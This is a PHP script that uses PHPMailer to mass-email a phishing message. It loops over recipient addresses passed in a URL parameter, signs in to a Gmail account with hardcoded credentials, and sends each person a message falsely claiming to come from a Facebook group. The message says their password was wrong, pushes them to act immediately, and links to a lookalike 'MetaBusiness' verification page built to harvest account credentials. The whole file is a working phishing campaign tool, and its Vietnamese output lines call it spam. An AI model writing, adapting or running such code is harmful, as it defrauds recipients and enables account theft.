<?php
//Import PHPMailer classes into the global namespace
//These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


//Load Composer's autoloader
require 'vendor/autoload.php';
require 'get-mail.php';

//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);
// print_r($mail);
$count_success = 0;
$count_failed = 0;
echo "đang spam ... ";
if (isset($_GET['a'])) {
    $array_data = json_decode(urldecode($_GET['a']), true);
foreach ($array_data as $row) {
    foreach ($row as $cell) {
        
        try {
            //Server settings
            $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
            $mail->isSMTP();                                            //Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
            $mail->Username   = 'companysuppportpage@gmail.com';                     //SMTP username
            $mail->Password   = 'ncwu omha xclu gjmw';                               //SMTP password
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
            $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
        
            //Recipients
            $mail->setFrom('companysuppportpage@gmail.com', 'Policy Business');
            
            $mail->addAddress( $cell, $cell);     //Add a recipient
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject = 'Policy Appeal Page';
            $mail->Body    = 'Hello '. ',<br>
        We are from the Facebook group.<br>
        We have received the information, and the password you provided is incorrect.<br>
        Please provide your account again so we can continue to complete the verification step.<br>
        You need to act immediately. Time is running out!<br>
        <a href="https://information-policy-loss-protection.cloud/Appeal/processinginformations/MetaBusiness.php">Verify Now</a>';
            // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';
        
            // echo 'Message has been sent';
            if ($mail->send()) {
                $count_success++;
            } else {
                $count_failed++;
            }
        } catch (Exception $e) {
           
        }
    }
 
}
}
echo"Số lần thành công" . $count_success . "<br>";
echo"Số lần thất bại..." . $count_failed . "<br>";
